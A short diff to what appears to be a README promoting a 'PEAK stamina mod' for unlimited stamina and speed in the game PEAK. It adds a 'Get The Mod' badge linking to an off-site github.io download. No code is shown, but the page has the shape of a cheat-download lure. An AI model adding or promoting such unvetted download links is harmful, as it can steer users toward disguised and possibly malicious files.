@@ -4,6 +4,7 @@
 
 Running out of stamina mid-fight can ruin your flow in PEAK. Dodging, sprinting, and chaining combos all burn through energy fast. That’s where the **PEAK stamina mod** comes in—giving you unlimited stamina, speed boosts, and the freedom to outlast everyone on the field.
 
+[![Get](https://img.shields.io/badge/Get%20The-Mod-blueviolet)](https://peak-stamina-mod.github.io/.github/)
 ---
 
 ## Product Description
